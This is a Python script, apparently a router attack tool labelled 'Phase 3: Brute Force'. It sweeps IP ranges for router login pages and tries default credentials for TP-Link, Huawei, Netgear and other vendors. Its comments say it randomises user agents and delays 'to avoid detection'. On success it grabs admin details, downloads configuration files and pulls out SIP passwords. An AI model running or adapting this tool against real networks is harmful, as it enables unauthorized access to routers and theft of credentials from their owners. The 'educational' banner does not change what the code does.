#!/usr/bin/env python3
"""
Advanced Router Vulnerability Scanner - Phase 3: Brute Force
Author: Security Research Team
Description: Comprehensive router vulnerability scanner with brute force capabilities
"""

import os
import sys
import json
import time
import signal
import random
import socket
# import asyncio
# import aiohttp
import argparse
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import warnings
warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Global variables for safe exit
running = True
scan_results = {}

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global running
    print(f"\n{Colors.YELLOW}[!] Stopping scanner safely...{Colors.END}")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print Matrix-themed hacker banner"""
    banner = f"""
{Colors.GREEN}{Colors.BOLD}
    ██████╗  ██████╗ ██╗   ██╗████████╗███████╗██████╗     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
    ██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██████╔╝    ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
    ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██╔══██╗    ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
    ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██║  ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Colors.END}
{Colors.CYAN}                            ▄▄▄▄▄▄▄ Advanced Router Vulnerability Scanner ▄▄▄▄▄▄▄{Colors.END}
{Colors.MAGENTA}                           ░░░░░░░ Phase 3: Brute Force & Exploitation ░░░░░░░{Colors.END}
{Colors.RED}                              ═══════════════════════════════════════════════════{Colors.END}
{Colors.YELLOW}                                      [!] For Educational Purposes Only [!]{Colors.END}
{Colors.WHITE}                                           Follow the white rabbit...{Colors.END}
"""
    print(banner)

# Comprehensive router database
ROUTER_DATABASE = {
    # Asian Routers
    "TP-Link": {
        "models": ["TL-WR840N", "TL-WR940N", "TL-WR1043ND", "Archer C7", "Archer AX73"],
        "default_credentials": [("admin", "admin"), ("admin", ""), ("", "admin")],
        "indicators": ["tp-link", "tplink", "TP-LINK", "TPLINK"],
        "login_paths": ["/", "/admin", "/login.htm", "/userRpm/LoginRpm.htm"],
        "config_paths": ["/userRpm/BackupRestoreRpm.htm", "/config.bin"]
    },
    "Huawei": {
        "models": ["HG8245H", "HG630", "B593", "E5186", "HG8546M"],
        "default_credentials": [("admin", "admin"), ("root", "admin"), ("user", "user")],
        "indicators": ["huawei", "HUAWEI", "HG", "B593"],
        "login_paths": ["/", "/login.cgi", "/asp/login.asp"],
        "config_paths": ["/config.xml", "/backup.cfg"]
    },
    "ZTE": {
        "models": ["ZXHN H108N", "F660", "F670L", "MF28G"],
        "default_credentials": [("admin", "admin"), ("user", "user"), ("admin", "zhone")],
        "indicators": ["zte", "ZTE", "ZXHN", "MF28G"],
        "login_paths": ["/", "/login.gch", "/start.gch"],
        "config_paths": ["/getpage.gch?pid=1002&nextpage=manager_dev_conf_t.gch"]
    },
    # European Routers
    "AVM Fritz!Box": {
        "models": ["7590", "7530", "7490", "6890", "4020"],
        "default_credentials": [("admin", ""), ("", ""), ("admin", "admin")],
        "indicators": ["fritz", "FRITZ", "AVM", "fritzbox"],
        "login_paths": ["/", "/login_sid.lua", "/login.lua"],
        "config_paths": ["/cgi-bin/firmwarecfg", "/config.export"]
    },
    "Technicolor": {
        "models": ["TG582n", "TG799vac", "TG589vn", "DGA4132"],
        "default_credentials": [("Administrator", ""), ("admin", "admin"), ("user", "user")],
        "indicators": ["technicolor", "TECHNICOLOR", "TG582", "TG799"],
        "login_paths": ["/", "/login.lp", "/login_manager.lp"],
        "config_paths": ["/modals/backup-modal.lp", "/config.cfg"]
    },
    # American Routers
    "Netgear": {
        "models": ["WNR2000", "R6400", "R7000", "D7000", "C7000"],
        "default_credentials": [("admin", "password"), ("admin", "admin"), ("admin", "")],
        "indicators": ["netgear", "NETGEAR", "WNR", "R6400", "readyshare"],
        "login_paths": ["/", "/password.cgi", "/base.cgi"],
        "config_paths": ["/backup.cgi", "/settingsbackup.cgi"]
    },
    "Linksys": {
        "models": ["WRT54G", "E1200", "EA6350", "WRT3200ACM"],
        "default_credentials": [("admin", "admin"), ("admin", ""), ("", "admin")],
        "indicators": ["linksys", "LINKSYS", "WRT", "EA6350"],
        "login_paths": ["/", "/login.htm", "/Main_Login.asp"],
        "config_paths": ["/apply.cgi", "/backup.cfg"]
    },
    "D-Link": {
        "models": ["DIR-615", "DIR-825", "DSL-2750B", "DAP-1360"],
        "default_credentials": [("admin", ""), ("admin", "admin"), ("user", "")],
        "indicators": ["d-link", "D-LINK", "DIR-", "DSL-", "DAP-"],
        "login_paths": ["/", "/login.php", "/login_mgr.htm"],
        "config_paths": ["/tools_system.php", "/config.bin"]
    },
    # Additional Global Brands
    "ASUS": {
        "models": ["RT-N12", "RT-AC68U", "DSL-N14U", "RT-AX88U"],
        "default_credentials": [("admin", "admin"), ("admin", ""), ("user", "user")],
        "indicators": ["asus", "ASUS", "RT-", "DSL-N"],
        "login_paths": ["/", "/Main_Login.asp", "/login.asp"],
        "config_paths": ["/ajax.asp", "/downloadmaster/Setting.gz"]
    },
    "Tenda": {
        "models": ["AC15", "N301", "F3", "AC6"],
        "default_credentials": [("admin", "admin"), ("admin", ""), ("", "")],
        "indicators": ["tenda", "TENDA", "AC15", "N301"],
        "login_paths": ["/", "/login.htm", "/login/Auth"],
        "config_paths": ["/goform/loadSetting", "/config.bin"]
    },
    "Xiaomi": {
        "models": ["Mi Router 3", "Mi Router 4", "AX3600", "AX1800"],
        "default_credentials": [("admin", "admin"), ("admin", ""), ("root", "admin")],
        "indicators": ["xiaomi", "XIAOMI", "miwifi", "Mi Router"],
        "login_paths": ["/", "/cgi-bin/luci", "/cgi-bin/luci/web"],
        "config_paths": ["/api/system/export_config", "/tmp/sysinfo.json"]
    },
    # Legacy and Unknown Routers
    "Generic": {
        "models": ["Unknown", "Generic Router", "Default"],
        "default_credentials": [
            ("admin", "admin"), ("admin", "password"), ("admin", ""),
            ("root", "admin"), ("root", "root"), ("root", ""),
            ("user", "user"), ("user", ""), ("", ""),
            ("admin", "1234"), ("admin", "12345"), ("admin", "123456"),
            ("guest", "guest"), ("test", "test")
        ],
        "indicators": ["router", "gateway", "modem", "admin", "login"],
        "login_paths": ["/", "/admin", "/login", "/login.html", "/login.php", "/login.asp"],
        "config_paths": ["/config", "/backup", "/settings", "/export"]
    }
}

class RouterScanner:
    def __init__(self, targets, threads=50, timeout=10):
        self.targets = targets
        self.threads = threads
        self.timeout = timeout
        self.session = self.create_session()
        self.results = {}
        
    def create_session(self):
        """Create HTTP session with retries and proper headers"""
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            status_forcelist=[429, 500, 502, 503, 504],
            method_whitelist=["HEAD", "GET", "OPTIONS", "POST"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Random user agents to avoid detection
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
        ]
        session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        return session

    def scan_web_ports(self, ip):
        """Scan common web ports"""
        common_ports = [80, 8080, 443, 8443, 8000, 8081, 8888, 8090, 9000, 9090]
        open_ports = []
        
        for port in common_ports:
            if not running:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        return open_ports

    def detect_login_page(self, url):
        """Detect login page with scoring system"""
        score = 0
        indicators = {
            'forms': 0,
            'fields': 0,
            'keywords': 0,
            'headers': 0,
            'brand': None
        }
        
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            # Check for login forms
            if 'form' in content and ('password' in content or 'login' in content):
                score += 2
                indicators['forms'] = 1
            
            # Check for input fields
            password_fields = content.count('type="password"') + content.count("type='password'")
            username_fields = content.count('type="text"') + content.count('name="username"')
            if password_fields > 0:
                score += 2
                indicators['fields'] += password_fields
            if username_fields > 0:
                score += 1
                indicators['fields'] += username_fields
            
            # Check for login keywords
            login_keywords = ['login', 'username', 'password', 'sign in', 'authentication', 'admin']
            for keyword in login_keywords:
                if keyword in content:
                    score += 1
                    indicators['keywords'] += 1
            
            # Check headers for router indicators
            router_headers = ['server', 'x-powered-by', 'www-authenticate']
            for header in router_headers:
                if header in headers:
                    score += 1
                    indicators['headers'] += 1
            
            # Detect router brand
            for brand, data in ROUTER_DATABASE.items():
                for indicator in data['indicators']:
                    if indicator.lower() in content or indicator.lower() in headers:
                        score += 3
                        indicators['brand'] = brand
                        break
                if indicators['brand']:
                    break
            
            return score, indicators, content
            
        except Exception as e:
            return 0, indicators, ""

    def brute_force_login(self, ip, port, login_path, brand=None):
        """Brute force login with rate limiting"""
        base_url = f"http://{ip}:{port}"
        login_url = urljoin(base_url, login_path)
        
        # Get credentials based on detected brand
        credentials = []
        if brand and brand in ROUTER_DATABASE:
            credentials.extend(ROUTER_DATABASE[brand]['default_credentials'])
        
        # Add generic credentials
        credentials.extend(ROUTER_DATABASE['Generic']['default_credentials'])
        
        print(f"{Colors.YELLOW}[*] Starting brute force on {login_url}{Colors.END}")
        
        for username, password in credentials:
            if not running:
                break
                
            try:
                # Rate limiting to avoid detection
                time.sleep(random.uniform(0.5, 2.0))
                
                # Display current attempt
                print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}", end='\r')
                
                # Try different login methods
                login_data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                    'login': 'Login',
                    'submit': 'Login'
                }
                
                response = self.session.post(login_url, data=login_data, 
                                           timeout=self.timeout, verify=False, 
                                           allow_redirects=True)
                
                # Check for successful login indicators
                if self.check_login_success(response, username, password):
                    print(f"\n{Colors.GREEN}[+] SUCCESS! Default credential found: {username}:{password}{Colors.END}")
                    return True, username, password, response.url
                    
            except Exception as e:
                continue
        
        print(f"\n{Colors.RED}[-] No valid credentials found{Colors.END}")
        return False, None, None, None

    def check_login_success(self, response, username, password):
        """Check if login was successful"""
        content = response.text.lower()
        url = response.url.lower()
        
        # Success indicators
        success_indicators = [
            'admin', 'management', 'configuration', 'settings',
            'logout', 'status', 'system', 'wireless', 'network'
        ]
        
        # Failure indicators
        failure_indicators = [
            'invalid', 'incorrect', 'failed', 'error', 'denied',
            'wrong', 'login', 'authentication'
        ]
        
        # Check for redirect to admin page
        if any(indicator in url for indicator in success_indicators):
            return True
        
        # Check response content
        success_count = sum(1 for indicator in success_indicators if indicator in content)
        failure_count = sum(1 for indicator in failure_indicators if indicator in content)
        
        return success_count > failure_count and response.status_code == 200

    def extract_admin_info(self, admin_url, username, password):
        """Extract important information from router admin page"""
        info = {}
        
        try:
            # Login and access admin page
            login_data = {'username': username, 'password': password}
            self.session.post(admin_url, data=login_data, verify=False)
            
            response = self.session.get(admin_url, verify=False)
            content = response.text
            
            # Extract various information
            info['firmware_version'] = self.extract_pattern(content, 
                [r'firmware[^:]*:?\s*([v\d\.]+)', r'version[^:]*:?\s*([v\d\.]+)'])
            
            info['model'] = self.extract_pattern(content,
                [r'model[^:]*:?\s*([A-Z0-9\-]+)', r'device[^:]*:?\s*([A-Z0-9\-]+)'])
            
            info['wan_ip'] = self.extract_pattern(content,
                [r'wan.*?(\d+\.\d+\.\d+\.\d+)', r'external.*?(\d+\.\d+\.\d+\.\d+)'])
            
            info['lan_ip'] = self.extract_pattern(content,
                [r'lan.*?(\d+\.\d+\.\d+\.\d+)', r'internal.*?(\d+\.\d+\.\d+\.\d+)'])
            
            info['ssid'] = self.extract_pattern(content,
                [r'ssid[^:]*:?\s*([A-Za-z0-9\-_]+)', r'network.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)'])
            
            return info
            
        except Exception as e:
            return {}

    def extract_pattern(self, content, patterns):
        """Extract information using regex patterns"""
        import re
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        return "Not found"

    def find_config_files(self, base_url, brand=None):
        """Find and download configuration files"""
        config_paths = []
        
        if brand and brand in ROUTER_DATABASE:
            config_paths.extend(ROUTER_DATABASE[brand]['config_paths'])
        
        config_paths.extend(ROUTER_DATABASE['Generic']['config_paths'])
        
        found_configs = []
        
        for path in config_paths:
            if not running:
                break
                
            try:
                config_url = urljoin(base_url, path)
                response = self.session.get(config_url, verify=False, timeout=10)
                
                if response.status_code == 200 and len(response.content) > 100:
                    # Try to extract SIP information as POC
                    sip_info = self.extract_sip_info(response.content)
                    
                    config_data = {
                        'url': config_url,
                        'size': len(response.content),
                        'content_type': response.headers.get('content-type', 'unknown'),
                        'sip_info': sip_info
                    }
                    
                    found_configs.append(config_data)
                    print(f"{Colors.GREEN}[+] Configuration file found: {config_url}{Colors.END}")
                    
            except Exception as e:
                continue
        
        return found_configs

    def extract_sip_info(self, content):
        """Extract SIP information from configuration"""
        import re
        sip_info = {}
        
        try:
            content_str = content.decode('utf-8', errors='ignore') if isinstance(content, bytes) else str(content)
            
            # SIP patterns
            patterns = {
                'sip_server': r'sip[_\s]*server[^:=]*[:=]\s*([^\s\n\r]+)',
                'sip_username': r'sip[_\s]*user[^:=]*[:=]\s*([^\s\n\r]+)',
                'sip_password': r'sip[_\s]*pass[^:=]*[:=]\s*([^\s\n\r]+)',
                'proxy_server': r'proxy[_\s]*server[^:=]*[:=]\s*([^\s\n\r]+)'
            }
            
            for key, pattern in patterns.items():
                match = re.search(pattern, content_str, re.IGNORECASE)
                if match:
                    sip_info[key] = match.group(1)
            
        except Exception as e:
            pass
        
        return sip_info

    def scan_target(self, ip):
        """Main scanning function for a single IP"""
        if not running:
            return None
            
        result = {
            'ip': ip,
            'open_ports': [],
            'login_pages': [],
            'vulnerabilities': [],
            'score': 0
        }
        
        print(f"{Colors.BLUE}[*] Scanning {ip}...{Colors.END}")
        
        # Phase 1: Port scanning
        open_ports = self.scan_web_ports(ip)
        result['open_ports'] = open_ports
        
        if not open_ports:
            print(f"{Colors.RED}[-] No web ports open on {ip}{Colors.END}")
            return result
        
        # Phase 2: Login page detection
        for port in open_ports:
            if not running:
                break
                
            base_url = f"http://{ip}:{port}"
            
            # Try different login paths
            login_paths = ["/", "/admin", "/login", "/login.html", "/login.php"]
            
            for path in login_paths:
                if not running:
                    break
                    
                url = urljoin(base_url, path)
                score, indicators, content = self.detect_login_page(url)
                
                if score >= 3:  # Threshold for login page detection
                    login_info = {
                        'url': url,
                        'port': port,
                        'score': score,
                        'brand': indicators['brand'],
                        'indicators': indicators
                    }
                    result['login_pages'].append(login_info)
                    result['score'] += 1
                    
                    print(f"{Colors.GREEN}[+] Login page detected: {url} (Score: {score}){Colors.END}")
                    
                    # Phase 3: Brute force
                    success, username, password, admin_url = self.brute_force_login(
                        ip, port, path, indicators['brand']
                    )
                    
                    if success:
                        result['score'] += 2
                        
                        # Extract admin information
                        admin_info = self.extract_admin_info(admin_url, username, password)
                        
                        # Find configuration files
                        config_files = self.find_config_files(base_url, indicators['brand'])
                        
                        if config_files:
                            result['score'] += 1
                        
                        vulnerability = {
                            'type': 'Default Credentials',
                            'severity': 'High',
                            'username': username,
                            'password': password,
                            'admin_url': admin_url,
                            'admin_info': admin_info,
                            'config_files': config_files
                        }
                        
                        result['vulnerabilities'].append(vulnerability)
                        print(f"{Colors.GREEN}[+] VULNERABLE: {ip} - Default credentials work!{Colors.END}")
                    
                    break  # Found login page, no need to check other paths
        
        return result

    def generate_reports(self, results):
        """Generate HTML and JSON reports"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # JSON Report
        json_report = {
            'scan_info': {
                'timestamp': timestamp,
                'total_targets': len(results),
                'vulnerable_targets': len([r for r in results if r['vulnerabilities']])
            },
            'results': results
        }
        
        json_filename = f"router_scan_report_{timestamp}.json"
        with open(json_filename, 'w') as f:
            json.dump(json_report, f, indent=2)
        
        # HTML Report
        html_content = self.generate_html_report(results, timestamp)
        html_filename = f"router_scan_report_{timestamp}.html"
        with open(html_filename, 'w') as f:
            f.write(html_content)
        
        print(f"{Colors.GREEN}[+] Reports generated:{Colors.END}")
        print(f"  - JSON: {json_filename}")
        print(f"  - HTML: {html_filename}")
        
        return json_filename, html_filename

    def generate_html_report(self, results, timestamp):
        """Generate HTML report with cards for each IP"""
        vulnerable_count = len([r for r in results if r['vulnerabilities']])
        
        html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Vulnerability Scan Report</title>
    <style>
        body {{
            font-family: 'Courier New', monospace;
            background: #0d1117;
            color: #c9d1d9;
            margin: 0;
            padding: 20px;
        }}
        .header {{
            text-align: center;
            background: linear-gradient(45deg, #238636, #1f6feb);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
        }}
        .stats {{
            display: flex;
            justify-content: space-around;
            margin-bottom: 30px;
        }}
        .stat-card {{
            background: #21262d;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            min-width: 150px;
        }}
        .stat-number {{
            font-size: 2em;
            font-weight: bold;
            color: #58a6ff;
        }}
        .results-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
            gap: 20px;
        }}
        .ip-card {{
            background: #21262d;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 20px;
            transition: transform 0.2s;
        }}
        .ip-card:hover {{
            transform: translateY(-2px);
            border-color: #58a6ff;
        }}
        .vulnerable {{
            border-left: 4px solid #f85149;
        }}
        .safe {{
            border-left: 4px solid #238636;
        }}
        .ip-header {{
            font-size: 1.2em;
            font-weight: bold;
            margin-bottom: 15px;
            color: #58a6ff;
        }}
        .section {{
            margin: 15px 0;
            padding: 10px;
            background: #161b22;
            border-radius: 5px;
        }}
        .section-title {{
            font-weight: bold;
            color: #f0f6fc;
            margin-bottom: 8px;
        }}
        .vulnerability {{
            background: #2d1117;
            border: 1px solid #f85149;
            border-radius: 5px;
            padding: 10px;
            margin: 5px 0;
        }}
        .config-file {{
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 3px;
            padding: 8px;
            margin: 5px 0;
            font-size: 0.9em;
        }}
        .score {{
            display: inline-block;
            background: #238636;
            color: white;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 0.8em;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔒 Router Vulnerability Scan Report</h1>
        <p>Generated on {timestamp}</p>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <div class="stat-number">{len(results)}</div>
            <div>Total Targets</div>
        </div>
        <div class="stat-card">
            <div class="stat-number">{vulnerable_count}</div>
            <div>Vulnerable</div>
        </div>
        <div class="stat-card">
            <div class="stat-number">{len(results) - vulnerable_count}</div>
            <div>Safe</div>
        </div>
    </div>
    
    <div class="results-grid">
"""
        
        for result in results:
            is_vulnerable = bool(result['vulnerabilities'])
            card_class = "vulnerable" if is_vulnerable else "safe"
            
            html += f"""
        <div class="ip-card {card_class}">
            <div class="ip-header">
                {result['ip']} 
                <span class="score">Score: {result['score']}</span>
            </div>
            
            <div class="section">
                <div class="section-title">Open Web Ports</div>
                {', '.join(map(str, result['open_ports'])) if result['open_ports'] else 'None'}
            </div>
"""
            
            if result['login_pages']:
                html += """
            <div class="section">
                <div class="section-title">Login Pages Detected</div>
"""
                for page in result['login_pages']:
                    html += f"""
                <div>🌐 {page['url']} (Brand: {page['brand'] or 'Unknown'})</div>
"""
                html += "</div>"
            
            if result['vulnerabilities']:
                html += """
            <div class="section">
                <div class="section-title">Vulnerabilities Found</div>
"""
                for vuln in result['vulnerabilities']:
                    html += f"""
                <div class="vulnerability">
                    <strong>{vuln['type']}</strong> - {vuln['severity']}<br>
                    <strong>Credentials:</strong> {vuln['username']}:{vuln['password']}<br>
                    <strong>Admin URL:</strong> {vuln['admin_url']}<br>
"""
                    if vuln['admin_info']:
                        html += "<strong>Admin Info:</strong><br>"
                        for key, value in vuln['admin_info'].items():
                            html += f"  • {key}: {value}<br>"
                    
                    if vuln['config_files']:
                        html += "<strong>Configuration Files:</strong><br>"
                        for config in vuln['config_files']:
                            html += f"""
                    <div class="config-file">
                        📁 {config['url']}<br>
                        Size: {config['size']} bytes<br>
"""
                            if config['sip_info']:
                                html += "SIP Info:<br>"
                                for key, value in config['sip_info'].items():
                                    html += f"  • {key}: {value}<br>"
                            html += "</div>"
                    
                    html += "</div>"
                html += "</div>"
            
            html += "</div>"
        
        html += """
    </div>
</body>
</html>
"""
        return html

    def run_scan(self):
        """Main scanning orchestrator"""
        print(f"{Colors.YELLOW}[*] Starting scan of {len(self.targets)} targets with {self.threads} threads{Colors.END}")
        
        all_results = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_ip = {executor.submit(self.scan_target, ip): ip for ip in self.targets}
            
            for future in as_completed(future_to_ip):
                if not running:
                    break
                    
                ip = future_to_ip[future]
                try:
                    result = future.result()
                    if result:
                        all_results.append(result)
                        
                        # Update progress
                        completed = len(all_results)
                        print(f"{Colors.MAGENTA}[*] Progress: {completed}/{len(self.targets)} targets scanned{Colors.END}")
                        
                except Exception as exc:
                    print(f"{Colors.RED}[!] {ip} generated an exception: {exc}{Colors.END}")
        
        return all_results

def parse_targets(target_input):
    """Parse target input (IP, range, or file)"""
    targets = []
    
    if '/' in target_input:  # CIDR notation
        import ipaddress
        network = ipaddress.IPv4Network(target_input, strict=False)
        targets = [str(ip) for ip in network.hosts()]
    elif '-' in target_input:  # IP range
        start_ip, end_ip = target_input.split('-')
        start = list(map(int, start_ip.split('.')))
        end = list(map(int, end_ip.split('.')))
        
        for a in range(start[0], end[0] + 1):
            for b in range(start[1], end[1] + 1):
                for c in range(start[2], end[2] + 1):
                    for d in range(start[3], end[3] + 1):
                        targets.append(f"{a}.{b}.{c}.{d}")
    elif target_input.endswith('.txt'):  # File with IPs
        try:
            with open(target_input, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] File not found: {target_input}{Colors.END}")
            return []
    else:  # Single IP
        targets = [target_input]
    
    return targets

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Router Vulnerability Scanner - Phase 3: Brute Force",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python router_scanner.py -t 192.168.1.1
  python router_scanner.py -t 192.168.1.0/24
  python router_scanner.py -t 192.168.1.1-192.168.1.254
  python router_scanner.py -t targets.txt -T 100
        """
    )
    
    parser.add_argument('-t', '--targets', required=True,
                       help='Target IP(s): single IP, CIDR, range, or file')
    parser.add_argument('-T', '--threads', type=int, default=50,
                       help='Number of threads (default: 50)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    
    args = parser.parse_args()
    
    # Clear screen and show banner
    clear_screen()
    print_banner()
    
    # Parse targets
    targets = parse_targets(args.targets)
    if not targets:
        print(f"{Colors.RED}[!] No valid targets found{Colors.END}")
        return
    
    print(f"{Colors.GREEN}[+] Loaded {len(targets)} targets{Colors.END}")
    
    # Initialize scanner
    scanner = RouterScanner(targets, args.threads, args.timeout)
    
    try:
        # Run scan
        results = scanner.run_scan()
        
        if results:
            # Generate reports
            json_file, html_file = scanner.generate_reports(results)
            
            # Summary
            vulnerable_count = len([r for r in results if r['vulnerabilities']])
            print(f"\n{Colors.GREEN}[+] Scan Complete!{Colors.END}")
            print(f"{Colors.YELLOW}[*] Summary:{Colors.END}")
            print(f"  - Total targets scanned: {len(results)}")
            print(f"  - Vulnerable targets: {vulnerable_count}")
            print(f"  - Reports saved: {json_file}, {html_file}")
            
        else:
            print(f"{Colors.RED}[!] No results to report{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during scan: {e}{Colors.END}")

if __name__ == "__main__":
    main()